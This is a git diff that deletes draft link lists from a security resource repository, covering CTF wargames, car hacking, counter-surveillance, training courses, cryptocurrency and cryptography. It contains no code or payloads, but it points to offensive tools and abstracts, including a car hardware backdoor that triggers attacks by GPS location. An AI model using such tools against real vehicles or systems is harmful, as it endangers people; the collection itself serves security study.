-		* Description: RingZer0 Team's online CTF offers you tons of challenges designed to test and improve your hacking skills thru hacking challenge. Register and get a flag for every challenges. 
-	* [pwn0 Wargame](https://pwn0.com/)
-		* ?pwn0 is a network where (almost) anything goes. Just sign up, connect to the VPN, and start hacking. pwn0 on freenode ?
-	* [Microcorruption](https://microcorruption.com/login)
-		* Awesome wargame.
-	* [OverTheWire Wargames](http://overthewire.org/wargames/)
-		* OverTheWire provides several wargames publicly/freely available. All very good quality. Highly recommended.
-	* [Smash the Stack Wargames](http://smashthestack.org/)
-		* Smash the stack hosts several public wargames of very good quality for free use. Highly recommended.
-* Writeups
-	* [CTF Writeups](https://github.com/ctfs/write-ups)
-	* [CTF write-ups 2015](https://github.com/ctfs/write-ups-2015)
-	* [CTF write-ups 2017](https://github.com/ctfs/write-ups-2017)
-	* [Pwning (sometimes) with style Dragons? notes on CTFs](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)
-
-
-
-
-
-
-
diff --git a/Draft/Car Hacking.md b/Draft/Car Hacking.md
deleted file mode 100755
index 7c66e15..0000000
--- a/Draft/Car Hacking.md	
+++ /dev/null
@@ -1,116 +0,0 @@
-# Car Hacking
-
-## ToC
-
-* [General](#general)
-* [Writeups](#writeup)
-* [Papers](#papers)
-* [Talks & Presentations](#talks)
-* [Tools](#tools)
-
-
-
-
-#### Cull
-
-
-
-
-### End cull
-
-
-## <a name="general"></a>General
-
-Seriously check this first ---> [Awesome Vehicle Security List(github awesome lists)](https://github.com/jaredthecoder/awesome-vehicle-security)
-
-[Introduction to Hacking in Car Systems - Craig Smith - Troopers15](https://www.youtube.com/watch?v=WHDkf6kpE58)
-
-[Intro to Automotive Security - Ariel Zentner](https://www.youtube.com/watch?v=yAzqFhq06_E)
-
-[The OpenXC Platform](http://openxcplatform.com/)
-* OpenXC™ is a combination of open source hardware and software that lets you extend your vehicle with custom applications and pluggable modules.	
-
-
-
-
-
-## <a name="writeup"></a>Writeups/Blogposts/How-To
-
-[Broadcasting Your Attack: Security Testing DAB Radio In Cars](https://www.youtube.com/watch?v=ryNtz1nxmO4)
-
-[Tesla Model S JSON API (unofficial RE post)](http://docs.timdorr.apiary.io/#reference/vehicles)
-
-[Tesla Model S JSON API (unofficial RE post)](http://docs.timdorr.apiary.io/#reference/vehicles)
-
-[Cyber-attacks on vehicles P-I!](http://dn5.ljuska.org/napadi-na-auto-sistem-1.html)
-
-[Cyber-attacks on vehicles P-II!](http://dn5.ljuska.org/cyber-attacks-on-vehicles-2.html)
-
-[An Introduction to the CAN Bus: How to Programmatically Control a Car: Hacking the Voyage Ford Fusion to Change A/C Temperature](https://news.voyage.auto/an-introduction-to-the-can-bus-how-to-programmatically-control-a-car-f1b18be4f377)
-
-
-
-
-## <a name="talks"></a>Talks & Presentations
-
-[Hacking Cars with Python -Eric Evenchick PyCon 2017](https://www.youtube.com/watch?v=3bZNhMcv4Y8&app=desktop)
-* Modern cars are networks of computers, and a high end vehicle could have nearly 100 different computers inside. These devices control everything from the engine to the airbags. By understanding how these systems work, we can interface with vehicles to read data, perform diagnostics, and even modify operation.  In this talk, we'll discuss pyvit, the Python Vehicle Interface Toolkit. This library, combined with some open source hardware, allows developers to talk to automotive controllers from Python.  We will begin with an introduction to automotive networks, to provide a basis for understanding the tools. Next, we will look at the tools and show the basics of using them. Finally, we'll discuss real world applications of these tools, and how they're being used in the automotive world today.
-
-[Adventures in Automotive Networks and Control Units](https://www.youtube.com/watch?v=MEYCU62yeYk&app=desktop)
-* Charlie Miller & Chris Valasek
-
-[Broadcasting your attack: Security testing DAB radio in cars - Andy Davis](http://2015.ruxcon.org.au/assets/2015/slides/Broadcasting-your-attack-Security-testing-DAB-radio-in-cars.pdf)
-
-[A Survey of Remote Automotive Attack Surfaces  - Black Hat USA 2014](https://www.youtube.com/watch?v=mNhFGJVq2HE)
-
-[Broadcasting your attack: Security testing DAB radio in cars - Andy Davis](http://2015.ruxcon.org.au/assets/2015/slides/Broadcasting-your-attack-Security-testing-DAB-radio-in-cars.pdf)
-
-[A Vulnerability in Modern Automotive Standards and How We Exploited It](https://documents.trendmicro.com/assets/A-Vulnerability-in-Modern-Automotive-Standards-and-How-We-Exploited-It.pdf)
-
-[Car hacking: getting from A to B with Eve (SHA2017)](https://www.youtube.com/watch?v=l9760bzUN3E)
-* Car security is, not surprisingly, a hot topic; after all they are fast and heavy computer controlled machinery that nowadays come with all kinds of internet connectivity. So we decided to have a look at it. In our presentation, we’ll first cover some theory behind the IT-part of car architecture. We’ll discuss attack vectors and their likelihood of success, and then discuss the various vulnerabilities we found. Finally, we will combine these vulnerabilities into a remote attack. Depending on the disclosure process with the vendor, which is pending, we might be able to demonstrate the attack.
-
-
-
-
-## <a name="tool"></a>Tools
-
-[CANBus Triple](https://canb.us/)
-* General purpose Controller Area Network swiss army knife / development platform.
-
-[Yet Another Car Hacking Tool](https://asintsov.blogspot.ro/2016/03/yet-another-car-hacking-tool.html?m=1)
-
-[CANToolz](https://github.com/eik00d/CANToolz)
-* CANToolz is a framework for analysing CAN networks and devices. This tool based on different modules which can be assembled in pipe together and can be used by security researchers and automotive/OEM security testers for black-box analysis and etc. You can use this software for ECU discovery, MITM testing, fuzzing, bruteforcing, scanning or R&D testing and validation
-
-[canspy](https://github.com/manux81/canspy)
-* Very simple tool for users who need to interface with a device based on CAN (CAN/CANopen/J1939/NMEA2000/DeviceNet) such as motors, sensors and many other devices.
-
-[CBM - The Bicho](https://github.com/UnaPibaGeek/CBM)
-* For the first time, a hardware backdoor tool is presented having several advanced features, such as: remote control via SMS commands, automated launch of attack payloads at a GPS location or when a specific car status is reached; and a configuration interface that allows users to create attack payloads in an easy manner. Have you ever imagined the possibility of your car being automatically attacked based on its GPS coordinates, its current speed or any other set of parameters? Now it's possible :-)
-
-
-#### Hardware Tools
-
-[CBM - The Bicho](https://github.com/UnaPibaGeek/CBM)
-* For the first time, a hardware backdoor tool is presented having several advanced features, such as: remote control via SMS commands, automated launch of attack payloads at a GPS location or when a specific car status is reached; and a configuration interface that allows users to create attack payloads in an easy manner. Have you ever imagined the possibility of your car being automatically attacked based on its GPS coordinates, its current speed or any other set of parameters? Now it's possible :-)
-
-
-
-
-
-
-## <a name="papers"></a>Papers
-
-
-[Remote Exploitation of an  Unaltered Passenger Vehicle](http://illmatics.com/Remote%20Car%20Hacking.pdf)
-
-
-## Miscellaneous
-
-
-
-
-
-
-
diff --git a/Draft/Counter_Surveillance.md b/Draft/Counter_Surveillance.md
deleted file mode 100755
index a10c78b..0000000
--- a/Draft/Counter_Surveillance.md
+++ /dev/null
@@ -1,71 +0,0 @@
-## Counter Surveillance
-
-I am not a professional and may be a twelve year old child. Be wary.
-
-#### ToC
-* Cull
-* [Guides/Write-ups](#guides)
-* [Videos/Presentations](#videos)
-* [Papers](#papers)
-
-
-
-
-
-
-
-
-
-
------
-### <a name="guides">Guides/Write-ups</a>
-* Detecting Surveillance - Spiderlabs blog
-	* [1 Hardware Implants](http://blog.spiderlabs.com/2014/03/detecting-surveillance-state-surveillance-part-1-hardware-impants.html)
-	* [2 Radio Frequency Exfiltration](http://blog.spiderlabs.com/2014/03/detecting-a-surveillance-state-part-2-radio-frequency-exfiltration.html)
-	* [3 Infected Firmware](http://blog.spiderlabs.com/2014/04/detecting-a-surveillance-state-part-3-infected-firmware.html)
-* [A Simple Guide to TSCM Sweeps](http://www.international-intelligence.co.uk/tscm-sweep-guide.html)
-
-
------
-### <a name="videos">Videos</a>
-* [F*ck These Guys: Practical Countersurveillance Lisa Lorenzin - BsidesSF15](http://www.irongeek.com/i.php?page=videos/bsidessf2015/201-fck-these-guys-practical-countersurveillance-lisa-lorenzin)
-	* We've all seen the steady stream of revelations about the NSA's unconstitutional, illegal mass surveillance. Seems like there's a new transgression revealed every week! I'm getting outrage fatigue. So I decided to fight back... by looking for practical, realistic, everyday actions I can take to protect my privacy and civil liberties on the Internet, and sharing them with my friends. Join me in using encryption and privacy technology to resist eavesdropping and tracking, and to start to opt out of the bulk data collection that the NSA has unilaterally decided to secretly impose upon the world. Let's take back the Internet, one encrypted bit at a time.
-* [Dr. Philip Polstra - Am I Being Spied On?](https://www.youtube.com/watch?v=Bc7WoDXhcjM)
-	* Talk on cheap/free counter measures
-* [DNS May Be Hazardous to Your Health - Robert Stucke](https://www.youtube.com/watch?v=ZPbyDSvGasw)
-	* Great talk on attacking DNS
-* [CounterStrike Lawful Interception](https://www.youtube.com/watch?v=7HXLaRWk1SM)
-	* This short talk will cover the standards, devices and implementation of a mandatory part of our western Internet infrastructure. The central question is whether an overarching interception functionality might actually put national Internet infrastructure at a higher risk of being attacked successfully. The question is approached in this talk from a purely technical point of view, looking at how LI functionality is implemented by a major vendor and what issues arise from that implementation. Routers and other devices may get hurt in the process.
-	* [Slides](http://phenoelit.org/stuff/CSLI.pdf)
-
-
-
------
-### <a name="papers">Papers</a>
-* [Exploiting Lawful Intercept to Wiretap the Internet](https://www.blackhat.com/presentations/bh-dc-10/Cross_Tom/BlackHat-DC-2010-Cross-Attacking-LawfulI-Intercept-wp.pdf)
-	* This paper will review Cisco's architecture for lawful intercept from asecurity perspective. We explain how a number of different weaknesses in its design coupled with publicly disclosed security vulnerabilities could enable a malicious person to access the interface and spy on communications without leaving a trace. We then provide a set of recommendations for the redesign of the interface as well as SNMP authentication in general to better mitigate the security risks. 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Courses_Training.md b/Draft/Courses_Training.md
deleted file mode 100755
index 52b0fb9..0000000
--- a/Draft/Courses_Training.md
+++ /dev/null
@@ -1,193 +0,0 @@
-## Classes & Training
-
-
-
-
-### ToC
-
-* Cull
-* General Security Classes](#general)
-* General Sources/Repositories of Classes](#repo)
-* Incident Response and Forensics Training](#ir)
-* Penetration Testing Training](#pt)
-* Programming Classes/Training](#prog)
-* Reverse Engineering Classes/Training](#re)
-* Exploitation Development Training](#exploit)
-* UEFI/BIOS Training](#uefi)
-* Web Security Focused Training](#web)
-* Resources for instructors/Trainers](#resource)
-
-
-
-#### Cull 
-DVWA
-
-Hackingdojo
-
-BVWA
-
-#### End Cull
-
-
------
-## Heads Up
-These classes are all focused on computer/information security. If you're looking for online courses to learn material other than the mentioned, check out "coursera.com", Standford's online classes or MIT's online courses.
-* [Coursera](https://www.coursera.org/)
-* [MIT OpenCourseware](https://ocw.mit.edu/courses/)
-* [Standford](http://online.stanford.edu/courses)
-* [Udemy](https://www.udemy.com/courses/)
-
-
------
-### <a name="repo"></a>General Sources/Repository of Classes
-* [Hackr.io](http://hackr.io/)
-	* Share and discover the best programming tutorials and courses online.
-* [Open Security Training](https://www.opensecuritytraining.info
-* [Class Central](https://www.class-central.com/)
-	* Search engine for MooCs
-
-
-### <a name="general"></a>General Classes
-* [Learning How to Learn](https://www.coursera.org/learn/learning-how-to-learn)
-	* Free Coursera Course
-	* About this course: This course gives you easy access to the invaluable learning techniques used by experts in art, music, literature, math, science, sports, and many other disciplines. We’ll learn about the how the brain uses two very different learning modes and how it encapsulates (“chunks”) information. We’ll also cover illusions of learning, memory techniques, dealing with procrastination, and best practices shown by research to be most effective in helping you master tough subjects. 
-* [ENISA CERT Exercises and Training](http://www.enisa.europa.eu/activities/cert/support/exercise)
-	* ENISA CERT Exercises and training material was introduced in 2008, in 2012 and 2013 it was complemented with new exercise scenarios containing essential material for success in the CERT community and in the field of information security. In this page you will find the ENISA CERT Exercise material, containing Handbook for teachers, Toolset for students and Virtual Image to support hands on training sessions.
-* [SEEDLabs](http://www.cis.syr.edu/~wedu/seed/all_labs.html)
-	* People learn from mistakes. In security education, we study mistakes that lead to software vulnerabilities. Studying mistakes from the past not only help students understand why systems are vulnerable, why a "seemly-benign" mistake can turn into a disaster, and why many security mechanisms are needed. More importantly, it also helps students learn the common patterns of vulnerabilities, so they can avoid making similar mistakes in the future. Moreover, using vulnerabilities as case studies, students can learn the principles of secure design, secure programming, and security testing. 
-* [Teach Yourself Computer Science](https://teachyourselfcs.com/)
-* [Technical Development Guide - Google](https://www.google.com/about/careers/students/guide-to-technical-development.html)
-* [OSS University - Computer Science](https://github.com/open-source-society/computer-science)
-	* Path to a free self-taught education in Computer Science!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
------
-### <a name="ir"></a>Incident Response/Forensics/NSM Training
-* [Android Forensics & Security Testing - OpenSecurityTraining.info](http://opensecuritytraining.info/AndroidForensics.html)
-* [CS 259D Data Mining for Cyber Security Autumn 2014](http://web.stanford.edu/class/cs259d/)
-
-
-
-
-
-
-
-
------
-### <a name="pt"></a>Penetration Testing
-* [Pentester Lab](https://www.pentesterlab.com/)
-	* PentesterLab provides vulnerable systems that can be used to test and understand vulnerabilities.
-* [FSU Offensive Security 2014](http://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/)
-	* Florida State University Offensive Security 2014 Class materials
-* [FSU Offensive Security 2013](http://www.cs.fsu.edu/~redwood/OffensiveSecurity/)
-	* Florida State University Offensive Security 2013 Class materials
-* [HackSplaining](https://www.hacksplaining.com/faq)
-	* Security training aimed towards developers. Free.
-
-
-
------
-### <a name="prog"></a>Programming Classes/Courses
-* [asm - 0xAX](https://github.com/0xAX/asm)
-	* Learning assembly for linux-x64 
-* [Introductory Intel x86: Architecture, Assembly, Applications, & Alliteration](http://opensecuritytraining.info/IntroX86.html)
-	* This class serves as a foundation for the follow on Intermediate level x86 class. It teaches the basic concepts and describes the hardware that assembly code deals with. It also goes over many of the most common assembly instructions. Although x86 has hundreds of special purpose instructions, students will be shown it is possible to read most programs by knowing only around 20-30 instructions and their variations.
-* [Win32 ASM tutorials - Iczelion](http://win32assembly.programminghorizon.com/tutorials.html)
-
-
-
-
------
-### <a name="re"></a>Reverse Engineering
-* [Binary Auditing Training - Thorsten Schneider](http://www.binary-auditing.com/)
-	* The training package includes all necessary files to run a complete lecture for Binary Auditing and Reverse Code Engineering at university. All files are well sorted by topics and with increasing difficulty. You need Windows XP, Windows Vista or Windows 7 to use this training package. The training package does NOT include runnable viruses! 
-* [exrs - Binary Exploitation/Reverse Engineering Challenge training](https://github.com/wapiflapi/exrs)
-	* Exercises for learning Reverse Engineering and Exploitation. All binaries for these challenges are ELF 64-bit LSB executable, x86-64.
-* [mammon_'s tales to his grandson - Reverse Engineering](https://mammon.github.io/tales/)
-* [Software Modeling  and Verification - Static Analysis](http://www-i2.informatik.rwth-aachen.de/i2/spa12/)
-* [The Life of Binaries](http://opensecuritytraining.info/LifeOfBinaries.html)
-```
-* Topics include but are not limited to: 
-*	Scanning and tokenizing source code. 
-*	Parsing a grammar.  
-*	Different targets for x86 assembly object files generation. (E.g. relocatable vs. position independent code).  
-*	Linking object files together to create a well-formed binary.  
-*	Detailed descriptions of the high level similarities and low level differences between the Windows PE and Linux ELF binary formats. (NOTE: we didn't get to this in the class where the video was recorded, but the materials are in the slides)
-	* How an OS loads a binary into memory and links it on the fly before executing it.   
-	* Along the way we discuss the relevance of security at different stages of a binary’s life, from the tricks that can be played by a malicious compiler, to how viruses really work, to the way which malware “packers” duplicate OS process execution functionality, to the benefit of a security-enhanced OS loader which implements address space layout randomization (ASLR).
-```
-* [Introduction to Reverse Engineering Software - Dartmouth](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
-* [CSCI 4974 / 6974 Hardware Reverse Engineering](http://security.cs.rpi.edu/courses/hwre-spring2014/)
-
-
-
-
-
-
------
-## <a name="exploit"></a>Exploit Development Training
-* [exrs - Binary Exploitation/Reverse Engineering Challenge training](https://github.com/wapiflapi/exrs)
-	* Exercises for learning Reverse Engineering and Exploitation. All binaries for these challenges are ELF 64-bit LSB executable, x86-64.
-* [BFH Exploiting & Defense Course - Dobin Rutishauser](https://blog.compass-security.com/2017/05/bfh-exploiting-defense-course/)
-* [Modern Binary Exploitation - CSCI 4968 - Spring '15](http://security.cs.rpi.edu/courses/binexp-spring2015/)
-	* The course will start off by covering basic x86 reverse engineering, vulnerability analysis, and classical forms of Linux based userland binary exploitation. It will then transitionin to protections found on modern systems(Canaries, DEP, ASLR, RELRO, FortifySource, etc) and the techniques used to defeat them.Time permitting, the course will also cover other subjects in exploitation including kernel land and Windows based exploitation.
-* [armpwn](https://github.com/saelo/armpwn)
-	* Repository to train/learn memory corruption exploitation on the ARM platform. This is the material of a workshop I prepared for my CTF Team.
-* [BinTut](https://github.com/NoviceLive/bintut)
-	* Dynamic or live demonstration of classical exploitation techniques of typical memory corruption vulnerabilities, from debugging to payload generation and exploitation, for educational purposes
-
-
-
-
-
------
-### <a name="uefi"></a>UEFI/BIOS Training
-* [firmware-security-training](https://github.com/advanced-threat-research/firmware-security-training)
-
-
-
-### <a name="web"></a>Web Security Focused Training
-* [Google Gruyere -  Web Application Exploits and Defenses ](http://google-gruyere.appspot.com/)
-
-
-### <a name="data"></a>Data Science
-* [CS 259D Data Mining for Cyber Security Autumn 2014](http://web.stanford.edu/class/cs259d/)
-
-
-
------
-## <a name="resource"></a>Resources for Instructors and Trainers
-* [How To Give A Digital Security Training](https://medium.com/@geminiimatt/how-to-give-a-digital-security-training-4c83af667d40)
-* [LevelUP](https://www.level-up.cc/)
-	* Resources for the global digital safety training community.
-* [Be a Better Trainer](https://www.level-up.cc/you-the-trainer/be-a-better-trainer/)
-* [Teaching Evil - Chris Niemira](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t200-teaching-evil-chris-niemira)
-* [The Distribution of Users’ Computer Skills: Worse Than You Think](https://www.nngroup.com/articles/computer-skill-levels/)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/CryptoCurrencies.md b/Draft/CryptoCurrencies.md
deleted file mode 100755
index ddea0ba..0000000
--- a/Draft/CryptoCurrencies.md
+++ /dev/null
@@ -1,36 +0,0 @@
-## CryptoCurrencies
-
-##### I don?t know.
-
-ToC
-* [General](#general)
-* [Bitcoin](#bitcoin)
-* [Ethereum](#eth)
-* [Talks & Presentations](#talks)
-
-
------
-### <a name="general"></a> General 
-* [cryptocurrency](https://github.com/kilimchoi/cryptocurrency)
-	* Overview of top cryptocurrencies
-* [Blockchain Security research](https://gist.github.com/insp3ctre/403b8cb99eae2f52565874d8547fbc94)
-	* Open-source blockchain security research (contributions welcome!)
-
------
-### <a name="bitcoin"></a> Bitcoin
-* [Bitcoin Paper](https://bitcoin.org/bitcoin.pdf)
-	* [Bitcoin Paper Annotated - Genius](https://genius.com/2683753)
-	* [Bitcoin Paper Annotated - Fermats Library](https://fermatslibrary.com/s/bitcoin)
-* [Bitcointalk](https://bitcointalk.org/)
-* [/r/bitcoin](https://reddit.com/r/bitcoin)
-
------
-### <a name="eth"></a>Ethereum
-* [Ethereum 'White Paper'](https://github.com/ethereum/wiki/wiki/White-Paper)
-* [Cracking the Ethereum White Paper](https://medium.com/@FolusoOgunlana/cracking-the-ethereum-white-paper-e0e60c44126)
-* [The Ether Thief](https://www.bloomberg.com/features/2017-the-ether-thief/)
-
------
-### <a name="talks"></a>Talks/Presentations
-* [Deanonymisation of Clients in Bitcoin P2P Network](http://orbilu.uni.lu/bitstream/10993/18679/1/Ccsfp614s-biryukovATS.pdf)
-	* We present an effcient method to deanonymize Bitcoin users, which allows to link user pseudonyms to the IP addresses where the transactions are generated. Our techniques work for the most common and the most challenging scenario when users are behind NATs or rewalls of their ISPs. They allow to link transactions of a user behind a NAT and to distinguish connections and transactions of different users behind the same NAT. We also show that a natural countermeasure of using Tor or other anonymity services can be cut-o by abusing anti-DoS countermeasures of the Bitcoin network. Our attacks require only a few machines and have been experimentally verifed. The estimated success rate is between 11% and 60% depending on how stealthy an attacker wants to be. We propose several countermeasures to mitigate these new attacks.
\ No newline at end of file
diff --git a/Draft/Cryptography & Encryption.md b/Draft/Cryptography & Encryption.md
deleted file mode 100755
index eacaa39..0000000
--- a/Draft/Cryptography & Encryption.md	
+++ /dev/null
@@ -1,213 +0,0 @@
-## Cryptography
-
-##### TOC
-
-* [General Information](#general)
-* [Learning/Courses](#learn)
-* [Writeups](#write)
-* [Blogposts/Misc](#blog)
-* [Presentations](#presentation)
-* [Papers](#papers)
-* [Software](#soft)
-* [Stenography](#steno)
-* [Tools](#tools)
-* [Books](#books)
-* [Miscellaneous](#misc)
-
-
-### Cull
-
-
-https://conversations.im/xeps/multi-end.html
-
-### End Cull
-
-
------
-### <a name="general">General Information</a>
-* [Quick'n easy gpg cheatsheet](http://irtfweb.ifa.hawaii.edu/%7Elockhart/gpg/)
-* [Website detailing various crypto laws around world](http://www.cryptolaw.org/)
-* [Snake Oil Crypto Competition](https://snakeoil.cr.yp.to/)
-* [XOR Bitwise Operations Explained - Khan Academy](https://www.khanacademy.org/computing/computer-science/cryptography/ciphers/a/xor-bitwise-operation)
-* [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption)
-* [Differential Cryptanalysis for Dummies - Jon King](https://www.youtube.com/watch?v=xav-GUO_o4s&feature=youtu.be)
-* [Lifetimes of cryptographic hash functions](http://valerieaurora.org/hash.html)
-* [Top 10 Developer Crypto Mistakes](https://littlemaninmyhead.wordpress.com/2017/04/22/top-10-developer-crypto-mistakes/amp/)
-* [SSL/TLS and PKI History ](https://www.feistyduck.com/ssl-tls-and-pki-history/)
-	*  A comprehensive history of the most important events that shaped the SSL/TLS and PKI ecosystem. Based on Bulletproof SSL and TLS, by Ivan Ristic.
-* [Applied-Crypto-Hardening](https://github.com/BetterCrypto/Applied-Crypto-Hardening)
-	* Best Current Practices regarding secure online communication and configuration of services using cryptography. https://bettercrypto.org
-
-
-
------
-### <a name="learn">Courses</a>:
-* [Coursera Cryptography]()
-* [Matsano Crypto Challenges](https://www.Cryptopals.co)
-	* Go through a series of increasingly difficult challenges while learning all about cryptography. Expected knowledge level: You passed 9th grade math and you have 0 knowledge of crypto.
-* [A Graduate Course in Applied Cryptography - Dan Boneh and Victor Shoup](http://toc.cryptobook.us/)
-	* Version 0.3 - posted Dec. 9, 2016
-* [Primer on Zero-Knowledge Proofs](http://blog.cryptographyengineering.com/2014/11/zero-knowledge-proofs-illustrated-primer.html?m=1)
-* [Hyper-encryption - Wikipedia](https://en.wikipedia.org/wiki/Hyper-encryption)
-
-
-
------
-### <a name="write">Writeups</a>
-* [Attack of the week: FREAK (or 'factoring the NSA for fun and profit')](http://blog.cryptographyengineering.com/2015/03/attack-of-week-freak-or-factoring-nsa.html)
-* [An Empirical Study of Cryptographic Misuse in Android Applications](https://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf)
-* [Widespread Weak Keys in Network Devices](https://factorable.net/)
-* [Secrets and LIE-abilities: The State of Modern Secret Management (2017)](https://medium.com/on-docker/secrets-and-lie-abilities-the-state-of-modern-secret-management-2017-c82ec9136a3d)
-* [How to Implement Crypto Poorly - Sean Cassidy](https://github.com/cxxr/talks/blob/master/2016/grrcon/How%20to%20Implement%20Crypto%20Poorly.pdf)
-* [CBC Byte Flipping Attack—101 Approach](http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/)
-* [Demystifying the Signal Protocol for End-to-End Encryption (E2EE)](https://medium.com/@justinomora/demystifying-the-signal-protocol-for-end-to-end-encryption-e2ee-ad6a567e6cb4)
-* [A Formal Security Analysis of the Signal Messaging Protocol - Oct2016](https://eprint.iacr.org/2016/1013.pdf)
-* [Automated Padding Oracle Attacks with PadBuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)
-* [PadBuster v0.3 and the .NET Padding Oracle Attack](https://blog.gdssecurity.com/labs/2010/10/4/padbuster-v03-and-the-net-padding-oracle-attack.html)
-
-
-
------
-### <a name="blogs">Blogposts/Misc(doesnt explicitly fit in other sections)</a>
-* [Encrypting Strings in Android: Let's make better mistakes](http://tozny.com/blog/encrypting-strings-in-android-lets-make-better-mistakes/)
-* [Poor Man's Guide to Troubleshooting TLS Failures](http://blogs.technet.com/b/tspring/archive/2015/02/23/poor-man-s-guide-to-troubleshooting-tls-failures.aspx)
-* [Top 10 Developer Crypto Mistakes](https://littlemaninmyhead.wordpress.com/2017/04/22/top-10-developer-crypto-mistakes/)
-* [cr.yp.to blog](http://blog.cr.yp.to/index.html)
-* [Recovering BitLocker Keys on Windows 8.1 and 10](https://tribalchicken.io/recovering-bitlocker-keys-on-windows-8-1-and-10/)
-* [Crypto.is Blog](https://crypto.is/blog/)
-	* This blog series is intended to be a course on how remailers work, the theory behind them, and many of the choices that must be considered. Some of the topics we intended to dive deeply into in the future is how to have a directory of remailer nodes, how to handle messages that overflow the packet size, more details on Mixminion, as-yet-unimplemented Academic Papers (like Pynchon Gate and Sphinx), and more! Check out posts One, Two, Three, Four, and Five. The comments section should work, so please do leave comments if you have questions, insights, or corrections!
-
-
-
-
-
------
-### <a name="presentation">Presentations/Talks</a>
-* [Crypto: 48 Dirty Little Secrets Cryptographers Don’t Want You To Know - BlackHat2014](https://www.youtube.com/watch?v=mXdFHNJ6srY)
-* [SHA2017 Conference Videos](https://www.youtube.com/channel/UCHmPMdU0O9P_W6I1hNyvBIQ/videos)
-* [Hunting For Vulnerabilities In Signal - Markus Vervier - HITB 2017 AMS](https://www.youtube.com/watch?v=2n9HmllVftA)
-	* Signal is the most trusted secure messaging and secure voice application, recommended by Edward Snowden and the Grugq. And indeed Signal uses strong cryptography, relies on a solid system architecture, and you’ve never heard of any vulnerability in its code base. That’s what this talk is about: hunting for vulnerabilities in Signal. We will present vulnerabilities found in the Signal Android client, in the underlying Java libsignal library, and in example usage of the C libsignal library. Our demos will show how these can be used to crash Signal remotely, to bypass the MAC authentication for certain attached files, and to trigger memory corruption bugs. Combined with vulnerabilities in the Android system it is even possible to remotely brick certain Android devices. We will demonstrate how to initiate a permanent boot loop via a single Signal message. We will also describe the general architecture of Signal, its attack surface, the tools you can use to analyze it, and the general threat model for secure mobile communication apps.
-
-
-
-
-
------
-### <a name="papers">Papers</a>
-* [Get Your Hands Off My Laptop: Physical Side-Channel Key-Extraction Attacks On PCs](http://www.tau.ac.il/~tromer/handsoff/)
-	* We demonstrated physical side-channel attacks on a popular software implementation of RSA and ElGamal, running on laptop computers. Our attacks use novel side channels and are based on the observation that the "ground" electric potential in many computers fluctuates in a computation-dependent way. An attacker can measure this signal by touching exposed metal on the computer's chassis with a plain wire, or even with a bare hand. The signal can also be measured at the remote end of Ethernet, VGA or USB cables. Through suitable cryptanalysis and signal processing, we have extracted 4096-bit RSA keys and 3072-bit ElGamal keys from laptops, via each of these channels, as well as via power analysis and electromagnetic probing. Despite the GHz-scale clock rate of the laptops and numerous noise sources, the full attacks require a few seconds of measurements using Medium Frequency signals (around 2 MHz), or one hour using Low Frequency signals (up to 40 kHz).
-* [Why does cryptographic software fail? A case study and open problems](http://pdos.csail.mit.edu/papers/cryptobugs:apsys14.pdf)
-	* Abstract: Mistakes in cryptographic software implementations often undermine the strong security guarantees offered by cryptography. This paper presents a systematic study of cryptographic vulnerabilities in practice, an examination of state-of-the-art techniques to prevent such vulnerabilities, and a discussion of open problems and possible future research directions. Our study covers 269 cryptographic vulnerabilities reported in the CVE database from January 2011 to May 2014. The results show that just 17% of the bugs are in cryptographic libraries (which often have devastating consequences), and the remaining 83% are misuses of cryptographic libraries by individual applications. We observe that preventing bugs in different parts of a system requires different techniques, and that no effective techniques exist to deal with certain classes of mistakes, such as weak key generation.
-* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
-	* Here, we describe a new acoustic cryptanalysis key extraction attack, applicable to GnuPG's current implementation of RSA. The attack can extract full 4096-bit RSA decryption keys from laptop computers (of various models), within an hour, using the sound generated by the computer during the decryption of some chosen ciphertexts. We experimentally demonstrate that such attacks can be carried out, using either a plain mobile phone placed next to the computer, or a more sensitive microphone placed 4 meters away.
-* [Toward Robust Hidden Volumes Using Write-Only Oblivious RAM](https://eprint.iacr.org/2014/344.pdf) 
-	* With sensitive data being increasingly stored on mobile devices and laptops, hard disk encryption is more important than ever. In partic- ular, being able to plausibly deny that a hard disk contains certain information is a very useful and interesting research goal. However, it has been known for some time that existing “hidden volume” so- lutions, like TrueCrypt, fail in the face of an adversary who is able to observe the contents of a disk on multiple, separate occasions. In this work, we explore more robust constructions for hidden vol- umes and present HIVE, which is resistant to more powerful ad- versaries with multiple-snapshot capabilities. In pursuit of this, we propose the first security definitions for hidden volumes, and prove HIVE secure under these definitions. At the core of HIVE, we de- sign a new write-only Oblivious RAM. We show that, when only hiding writes, it is possible to achieve ORAM with optimal O (1) communication complexity and only poly-logarithmic user mem- ory.  This is a significant improvement over existing work and an independently interesting result.  We go on to show that our write- only ORAM is specially equipped to provide hidden volume func- tionality with low overhead and significantly increased security. Fi- nally, we implement HIVE as a Linux kernel block device to show both its practicality and usefulness on existing platforms.
-* [A Messy State of the Union: Taming the Composite State Machines of TLS](https://www.smacktls.com/smack.pdf)
-	* Abstract —Implementations of the Transport Layer Security (TLS) protocol must handle a variety of protocol versions and extensions, authentication modes and key exchange methods, where each combination may prescribe a different message sequence between the client and the server. We address the problem of designing a robust composite state machine that can correctly multiplex between these different protocol modes. We systematically test popular open-source TLS implementations for state machine bugs and discover several critical security vulnerabilities that have lain hidden in these libraries for years (they are now in the process of being patched). We argue that these vulnerabilities stem from incorrect compositions of individually correct state machines. We present the first verified implementation of a composite TLS state machine in C that can be embedded into OpenSSL and accounts for all its supported ciphersuites. Our attacks expose the need for the formal verifica- tion of core components in cryptographic protocol libraries; our implementation demonstrates that such mechanized proofs are within reach, even for mainstream TLS implementations.
-* [Indistinguishability Obfuscation from the Multilinear Subgroup Elimination Assumption](https://eprint.iacr.org/2014/309)
